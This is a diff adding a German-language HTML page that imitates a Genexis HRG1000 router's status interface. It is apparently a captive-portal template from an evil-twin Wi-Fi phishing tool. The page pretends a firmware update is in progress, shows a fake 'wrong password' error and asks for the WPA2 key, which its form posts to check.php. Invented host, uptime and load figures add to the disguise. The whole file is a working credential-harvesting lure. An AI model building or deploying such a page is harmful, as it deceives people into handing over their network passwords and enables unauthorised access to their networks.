@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Genexis DRGOS</title>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width; initial-scale=1.0;" /> 
+<style>
+body{
+	padding:0px;
+	margin:0px;
+	font:11px/1.545 verdana,arial,sans-serif;
+	color:#000000;
+}
+#footer {
+	position:absolute;
+	bottom:0px;
+	width:100%;
+	height: 55px;
+	text-align:left;
+	vertical-align:middle;
+	border-top: thin solid #000000;
+}
+#footer img {
+	margin-top:15px;
+	margin-left: 20px;
+}
+#top_nav {
+	width: 100%;
+	border-bottom:#000000 solid thin;
+	height:55px;
+	background-color:#002659;
+	color:#FFFFFF;
+}
+#top_nav p {
+	font-weight:bold;
+	font-size:20px;
+	margin:0px;
+	margin-left:30px;
+	display:table-row;
+}
+#top_nav_load {
+	position: relative;
+	float:right;
+	font-size:9.5px;
+	margin-top:8px;
+	margin-right: 6px;
+}
+#top_nav ul, #sub_nav ul {
+	list-style:none;
+	margin:0px;
+	display:table-row;
+	vertical-align:bottom;
+}
+#top_nav ul li, #sub_nav ul li {
+	display: inline;
+	font-size:12px;
+	margin-right:10px;
+	margin-top:28px;
+	padding:5px;
+	padding-left:10px;
+	padding-right:10px;
+}
+.selected a {
+	color:#1bbdf5 !important;
+}
+.selected:hover  {
+	background-color:transparent !important;
+}
+.seperator {
+	cursor:default !important;
+	background-color:transparent !important;
+}
+#top_nav ul li a, #sub_nav ul li a {
+	color:#FFFFFF;
+	text-decoration:none;
+	font-size:12px;
+}
+#top_nav ul li:hover, #sub_nav ul li:hover {
+	background-color:#44c8f5;
+	cursor:pointer;
+}
+#sub_nav {
+	width: 100%;
+	height:30px;
+	background-color:#002659;
+}
+#sub_nav ul {
+	display: block;
+	padding:0px;
+}
+#sub_nav ul li {
+	margin-right:0px !important;
+}
+#sub_nav ul li a {
+	font-size:10px !important;
+}
+#content {
+	width:100%;
+	min-height: 200px;
+}
+#content_box {
+	margin-top: 20px;
+	margin-left: 30px;
+	width:90%;
+}
+#content_box h1 {
+	margin:auto;
+	text-align:center;
+}
+#form_box {
+	margin-top:20px;
+	min-width:20%;
+}
+#form_box table {
+	font-size:12px;
+}
+.wrong_pass {
+	color:#E10003;
+	font-size:14px;
+	font-weight:bold;
+}
+@media only screen and (max-width: 1024px) {
+	#top_nav p {
+		display:none;
+	}
+	#top_nav ul {
+		bottom:0px;
+	}
+}
+@media only screen and (max-width: 480px) {
+	#top_nav_load {
+		display:none;	
+	}
+	#sub_nav ul li {
+		font-size:8px;
+		margin-right:2px;
+	}
+	#content_box {
+		width:80%;
+	}
+	#form_box {
+		text-align:center;
+	}
+}
+</style>
+</head>
+  
+<body>
+<div id="header">
+	<div id="top_nav">
+        <div id="top_nav_load"><strong>Host:</strong> 000300000573-0006a20f1f32d57c <strong>Betriebszeit:</strong> 11 days, 3:24 <strong>Laden:</strong> 0.14, 0.05, 0.01</div>
+        <div style="position:relative; display: table;">
+       	 	<p style="float:left;">HRG1000</p>
+        	<ul>
+        		<li><a href="#">Information</a></li>
+	            <li class="selected"><a href="#">Status</a></li>
+    	        <li class="seperator">-</li>
+	            <li><a href="#">System</a></li>
+	            <li><a href="#">Netzwerk</a></li>
+	            <li><a href="#">Kindersicherung</a></li>
+	        </ul>
+        </div>
+    </div>
+    <div id="sub_nav">
+		<ul>
+			<li><a href="#">Interfaces</a></li>
+			<li><a href="#">DHCP Client</a></li>
+			<li class="selected"><a href="#">WLAN Pr&uuml;fung</a></li>
+			<li><a href="#">CATV</a></li>
+			<li><a href="#">VoIP</a></li>
+			<li><a href="#">Diagnose-Programm</a></li>
+		</ul>
+    </div>
+</div>
+
+<div id="content">
+	<div id="content_box">
+    	<h1>Firmware Update</h1>
+        <div id="form_box">
+        	<h2>Um zu verbinden bitte WPA2-Kennwort eingeben</h2>
+        	<form method="POST" action="check.php" id="form1" name="form1">
+            	<table cellspacing="5px" cols="2">
+                	<tr>
+                    	<td colspan="2"><span class="wrong_pass">Passwort falsch! - Bitte wiederholen</span></td>
+                    </tr>
+                	<tr>
+                    	<td>WLAN-Passwort:</td>
+                        <td><input type="password" name="key1"></td>
+                    </tr>
+                    <tr>
+                    	<td>&nbsp;</td>
+                        <td><input type="submit" value="Verbindung herstellen"></td>
+                    </tr>
+                </table>
+            </form>
+        </div>
+    </div>
+</div>
+
+<div id="footer">
+	<img src="genexis-logo-small.jpg" alt="Genexis. Always connected" />
+</div>
+</body>
+ 
+</html>
